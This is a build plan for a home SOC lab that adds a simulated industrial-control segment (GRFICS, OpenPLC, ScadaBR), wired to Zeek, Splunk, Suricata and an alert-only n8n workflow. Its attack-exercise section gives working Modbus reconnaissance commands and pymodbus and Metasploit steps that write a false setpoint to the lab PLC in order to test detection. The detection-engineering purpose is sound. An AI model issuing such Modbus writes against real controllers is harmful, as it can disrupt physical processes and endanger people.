# OT/ICS Lab — Design & Build Plan

**Status:** Planned — not yet built  
**Depends on:** Existing lab (Proxmox, OPNsense, Zeek, Splunk, Suricata, n8n, IRIS) fully operational

---

## Design Goals

Add a realistic OT/ICS segment to the existing IT SOC lab to practice:

- ICS protocol monitoring (Modbus/TCP)
- IT/OT boundary detection engineering
- SOAR response for OT incidents (alert-only, human-in-the-loop — no auto-block)
- Full attack chain: IT pivot → OT recon → PLC manipulation → SOAR case

The existing detection stack (SPAN → Zeek, Suricata inline on OPNsense, Splunk, n8n, IRIS) handles OT with minimal additions — Zeek ICSNPP parsers, ET SCADA ruleset, a new Splunk index, and one new n8n branch.

---

## Tooling Decision

**GRFICS v2** — ships as a set of VirtualBox OVAs:

| VM | Role | Modbus |
|---|---|---|
| `grfics-sim` | Tennessee Eastman process simulation + 3D visualization | Modbus slave (I/O) |
| `openplc` | OpenPLC runtime / ladder logic | Modbus master → slave |
| `scadabr-hmi` | ScadaBR HMI | Modbus master → PLC |

> GRFICS already includes OpenPLC. A standalone OpenPLC VM is only needed later if you want to write custom ladder logic or test DNP3/EtherNet-IP. Run GRFICS as-is first.

---

## Network Design

### New VLANs

| VLAN | Name | Subnet | Gateway | Purdue Level |
|---|---|---|---|---|
| 50 | OT / Process | 10.10.50.0/24 | 10.10.50.1 (OPNsense) | L1–L2 |
| 55 | OT DMZ | 10.10.55.0/24 | 10.10.55.1 (OPNsense) | L3.5 (optional) |

### VM Assignments — VLAN 50

| VM | IP | Role |
|---|---|---|
| grfics-sim | 10.10.50.10 | Process simulation |
| openplc | 10.10.50.20 | PLC runtime |
| scadabr-hmi | 10.10.50.30 | HMI |
| historian / jump box | 10.10.55.40 | OT DMZ (optional) |

### Firewall Rules (OPNsense)

Model the IT/OT boundary — this is where the detection exercises live:

```
VLAN 10 (IT) → OT DMZ (VLAN 55): ALLOW (historian/jump box only)
OT DMZ (VLAN 55) → VLAN 50 (OT): ALLOW (Modbus/502 to PLC only)
VLAN 10 (IT) → VLAN 50 (OT): BLOCK (no direct IT→OT)
VLAN 30 (ATTACKERS) → VLAN 50 (OT): BLOCK (default; removed for attack exercise)
```

### SPAN / Zeek

VLAN 50 trunk already mirrors through ports 1–2 on the TL-SG108E once added to the trunk config. Zeek on 10.10.20.30 will see OT traffic with no additional hardware — just add VLAN 50 to the trunk and Zeek's capture interface picks it up automatically.

---

## OVA → Proxmox Conversion (First Blocker)

> **Do not run GRFICS nested inside a VirtualBox host VM.** Modbus traffic stays inside the nested virtual switch — Zeek will never see it. Convert to native Proxmox VMs.

### Steps

```bash
# 1. Extract VMDK from each OVA on a machine with VirtualBox tools
tar xvf grfics-sim.ova   # produces .vmdk + .ovf

# 2. Copy VMDKs to Proxmox storage
scp grfics-sim-disk1.vmdk root@pve1:/var/lib/vz/images/

# 3. Create a new VM in Proxmox (no disk), then import the disk
qm create 250 --name grfics-sim --memory 2048 --net0 virtio,bridge=vmbr1,tag=50
qm importdisk 250 /var/lib/vz/images/grfics-sim-disk1.vmdk local-lvm
qm set 250 --scsihw virtio-scsi-pci --scsi0 local-lvm:vm-250-disk-0
qm set 250 --boot c --bootdisk scsi0

# Repeat for openplc (VM 251) and scadabr-hmi (VM 252)
```

### Post-Import: Fix Guest Network Adapter Names

VirtualBox guests use `eth0` or `enp0s3`; Proxmox VirtIO names differ. After first boot:

```bash
# Inside each GRFICS VM
ip link show           # find the new adapter name (e.g., ens3, ens18)
nano /etc/network/interfaces   # update iface name to match
systemctl restart networking
```

Set static IPs matching the VLAN 50 plan (10.10.50.10 / .20 / .30), gateway 10.10.50.1.

### Verify Modbus Traffic

```bash
# From scadabr-hmi (10.10.50.30), confirm PLC responds
python3 -c "
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient('10.10.50.20')
c.connect()
print(c.read_coils(0, 10))
"
```

3D visualization should animate in the sim VM. If it does, Modbus is flowing between all three VMs.

---

## Wiring Into the Existing Detection Stack

### 1. Zeek — ICSNPP Modbus Parser

```bash
# On Zeek VM (10.10.20.30)
zkg install icsnpp-modbus

# Restart Zeek
zeekctl deploy
```

Produces `modbus.log` with: `ts`, `uid`, `id.orig_h`, `id.resp_h`, `func` (function code), `request`, `response`.

Key function codes to watch:

| Code | Name | Anomaly signal |
|---|---|---|
| 1 | Read Coils | Normal (HMI polling) |
| 5 | Write Single Coil | Suspicious if not from HMI |
| 6 | Write Single Register | Suspicious if not from HMI |
| 15 | Write Multiple Coils | High-value attack action |
| 16 | Write Multiple Registers | High-value attack action |

### 2. Splunk — New Index + Sourcetype

```bash
# On Splunk VM, add to indexes.conf
[ot]
homePath   = $SPLUNK_DB/ot/db
coldPath   = $SPLUNK_DB/ot/colddb
thawedPath = $SPLUNK_DB/ot/thaweddb
```

In Zeek UF `inputs.conf`, add:

```ini
[monitor:///opt/zeek/logs/current/modbus.log]
index = ot
sourcetype = zeek_modbus
```

### 3. Suricata — ET SCADA Ruleset

In OPNsense → Intrusion Detection → Download:

- Enable **ET SCADA** rule category
- Fires on Modbus anomalies at the OPNsense boundary (VLAN 10 → VLAN 50 attempts)
- EVE JSON already ships to `index=opnsense` via existing syslog pipeline

### 4. Baseline PCAP

Before any attack, capture clean traffic:

```bash
# On Zeek VM while GRFICS runs normally for 10–15 minutes
tcpdump -i <span-interface> -w /tmp/ot-baseline.pcap 'tcp port 502'
```

The HMI (`10.10.50.30`) is the **only legitimate Modbus master**. Any write to coils/registers from any other source is the anomaly signal.

---

## n8n — OT Alert Branch

### Trigger

Wazuh custom rule fires on Suricata EVE alert OR a Splunk scheduled alert on:

```splunk
index=ot sourcetype=zeek_modbus func IN ("5","6","15","16")
| where id_orig_h != "10.10.50.30"
| stats count by id_orig_h, id_resp_h, func
```

### Branch Logic

```
Switch (ot) → IRIS Add Case (OT) → Telegram OT Alert
```

**No OPNsense block. No auto-response.**

Telegram message format:

```
⚠️ OT ALERT — MODBUS WRITE DETECTED

Source: {{ $json.src_ip }}
Target PLC: {{ $json.dest_ip }}
Function Code: {{ $json.func }} (Write)
Time: {{ $json.timestamp }}

⚠️ Manual investigation required — no automated block applied.
OT traffic is NEVER auto-blocked.

IRIS Case: {{ $json.case_url }}
Splunk: {{ $json.splunk_url }}
```

> **Design note:** The deliberate absence of auto-block here is the point. In real OT environments, availability and safety outrank automated response. This branch documents that architectural decision.

---

## Attack Exercise

**Objective:** Pivot from VLAN 30 (Kali/voldemort) → OT boundary → write false setpoint to PLC → confirm full detection chain fires.

### Phase 1 — Recon from Kali

```bash
# Discover Modbus devices on VLAN 50 (after bypassing OPNsense rules for the exercise)
nmap -p 502 --script modbus-discover 10.10.50.0/24

# Or: PLCScan
python plcscan.py 10.10.50.0/24
```

### Phase 2 — PLC Manipulation

```bash
# pymodbus — write a coil (setpoint manipulation)
python3 -c "
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient('10.10.50.20')
c.connect()
c.write_coil(1, True)   # false setpoint
print('Written')
"

# Or Metasploit
msf > use auxiliary/scanner/scada/modbusclient
msf > set RHOSTS 10.10.50.20
msf > set MODBUS_FUNCCODE 5
msf > run
```

### Phase 3 — Confirm Detection Chain

| Layer | What to check |
|---|---|
| GRFICS 3D view | Process trip / overpressure visible |
| Zeek `modbus.log` | Write func code from non-HMI source |
| `index=ot` in Splunk | Event appears with correct fields |
| Suricata EVE | ET SCADA rule fires at boundary |
| n8n | OT branch executes |
| Telegram | OT alert message received |
| IRIS | Case created, IOC (attacker IP) added |

---

## Build Order

1. **OPNsense** — add VLAN 50 interface, firewall rules, add to SPAN trunk
2. **Convert GRFICS OVAs** → Proxmox VMs 250/251/252 on VLAN 50
3. **Fix guest networking** → static IPs → verify Modbus flows between sim/plc/hmi
4. **Zeek** — install `icsnpp-modbus` → verify `modbus.log` generates
5. **Splunk** — add `index=ot` + UF sourcetype for `modbus.log`
6. **Suricata** — enable ET SCADA ruleset in OPNsense
7. **Capture baseline PCAP** (normal HMI polling, no attacks)
8. **n8n OT branch** — Switch output, IRIS case, Telegram alert-only
9. **Attack exercise** — pivot from VLAN 30, write setpoint, confirm full chain
10. **Screenshots + IR report** — document as portfolio case study

---

## References

- [GRFICSv2 GitHub](https://github.com/Fortiphyd/GRFICSv2)
- [Zeek ICSNPP Modbus](https://github.com/cisagov/icsnpp-modbus)
- [ET SCADA Rules](https://rules.emergingthreats.net/open/snort-2.9.0/rules/emerging-scada.rules)
- [pymodbus](https://pymodbus.readthedocs.io/)
